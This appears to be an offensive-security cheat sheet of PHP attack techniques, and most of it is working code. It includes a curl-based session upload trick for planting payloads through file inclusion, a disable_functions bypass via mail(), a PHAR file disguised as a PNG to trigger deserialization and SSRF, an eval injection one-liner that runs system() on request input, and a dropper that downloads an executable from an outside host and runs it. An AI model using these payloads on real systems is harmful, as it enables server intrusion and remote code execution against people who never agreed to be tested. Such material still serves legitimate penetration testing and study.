# PHP

### Dangerous Functions

### PHP Temporary Files

PHP will create temporary files for files send with POST and for sessions. If we have a LFI we can get our php code onto the box and then include these.

#### PHP\_SESSION\_UPLOAD\_PROGRESS \(will create sess\_xct in /tmp\):

```text
curl --path-as-is '127.0.0.1/' -F 'PHP_SESSION_UPLOAD_PROGRESS=<payload' -F 'data=@dummy.txt' -H 'Cookie: PHPSESSID=xct';
```

### Disable Functions Bypass

#### Mail

```php
<?php
  file_put_contents('/tmp/exploit',"whoami>/tmp/output");
  mail("a","b","c","d","-H 'bash /tmp/exploit'");
?>
```

#### PHP7 Backtrace

[https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php](https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php)

### Interesting Behavior

PHP's `REQUEST` takes values from GET, POST and also COOKIE. This can lead to some interesting behavior by setting GET/POST and COOKIE parameters to different values. Values from COOKIE are disabled by default though.

### PHAR SSRF

If we have a file\_exists or similar method on uploaded content, we can request via phar:// wrapper. This allows to use deserialization gadgets.

```php
function generate_base_phar($o, $prefix){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "$prefix xct_was_here");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();    
    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

$object = new <Your Class>;
var_dump(serialize($object));

# prefix for faking a valid png
$prefix = "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x05\x0a\x00\x00\x01\x56";
$tempname = 'temp.phar'; // make it phar
$outfile = 'out.png';
file_put_contents($outfile, generate_base_phar($object, $prefix));
```

If no good gadgets are available SoapClient can be used to SSRF via gopher to other local services like MySQL.

### Eval Code Injection

Simple but effective:

```php
${system($_GET[1])}&1=ls
```

### Upload & Execute File

```text
<?php
    $data = file_get_contents("http://10.10.14.51/xc.exe");
    file_put_contents( "C:\\programdata\\xc_10.10.14.51_8080.exe", $data);
    system("C:\\programdata\\xc_10.10.14.51_8080.exe");
?>
```

